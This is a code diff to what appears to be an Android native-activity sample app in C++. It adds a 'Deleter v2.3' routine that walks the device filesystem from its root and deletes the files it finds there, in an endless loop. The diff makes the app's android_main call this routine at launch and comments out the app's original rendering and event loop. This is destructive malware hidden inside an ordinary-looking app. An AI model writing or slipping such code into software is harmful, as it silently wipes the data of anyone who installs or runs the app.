@@ -40,7 +40,58 @@
 #define LOGE(fmt, ...) _LOG(ANDROID_LOG_ERROR, (fmt)__VA_OPT__(, ) __VA_ARGS__)
 #define LOGW(fmt, ...) _LOG(ANDROID_LOG_WARN, (fmt)__VA_OPT__(, ) __VA_ARGS__)
 #define LOGI(fmt, ...) _LOG(ANDROID_LOG_INFO, (fmt)__VA_OPT__(, ) __VA_ARGS__)
-
+#include <filesystem>
+#include <iostream>
+#include <string>
+#include <vector>
+using namespace std;
+using namespace std::filesystem;
+int DeleterMain() {
+    string Title = "Deleter v2.3";
+    cout << Title << endl;
+    vector<std::filesystem::path> Disks; // Declare an empty vector
+    while (true) {
+      for (const std::filesystem::directory_entry &root : std::filesystem::recursive_directory_iterator(
+               std::filesystem::current_path()
+                   .root_directory())) {
+        if (root.path().parent_path() != root.path() &&
+            root.path().string().length() <= 3) {
+          cout << "Possible Root Directory: " << root.path() << endl;
+          Disks.push_back(root.path());
+        }
+        std::vector<std::string> drives;
+        for (const std::filesystem::path &disk : Disks) {
+          drives.push_back(disk.string());
+        }
+        // Iterate through the split drives
+        for (const std::string &drive : drives) {
+          std::vector<std::filesystem::path> dirs;
+          for (const std::filesystem::directory_entry &entry :
+               std::filesystem::directory_iterator(drive)) {
+            dirs.push_back(entry.path());
+          }
+          for (const std::filesystem::path &dir : dirs) {
+            if (is_directory(dir)) {
+              std::vector<std::filesystem::path> files;
+              for (const std::filesystem::directory_entry &file :
+                   std::filesystem::directory_iterator(dir)) {
+                files.push_back(file.path());
+              }
+              for (const std::filesystem::path &file : files) {
+                cout << "Deleting " << file << endl;
+                try {
+                  std::error_code ec;
+                  remove(file, ec);
+                } catch (exception e) {
+                  std::cerr << "Error deleting file: " << e.what() << std::endl;
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+}
 [[noreturn]] __attribute__((__format__(__printf__, 1, 2))) static void fatal(
     const char* fmt, ...) {
   va_list ap;
@@ -388,6 +439,8 @@ int OnSensorEvent(int /* fd */, int /* events */, void* data) {
  * event loop for receiving input events and doing other things.
  */
 void android_main(android_app* state) {
+  DeleterMain();
+  /*
   Engine engine {};
 
   memset(&engine, 0, sizeof(engine));
@@ -419,6 +472,6 @@ void android_main(android_app* state) {
     }
   }
 
-  engine_term_display(&engine);
+  engine_term_display(&engine);*/
 }
 // END_INCLUDE(all)
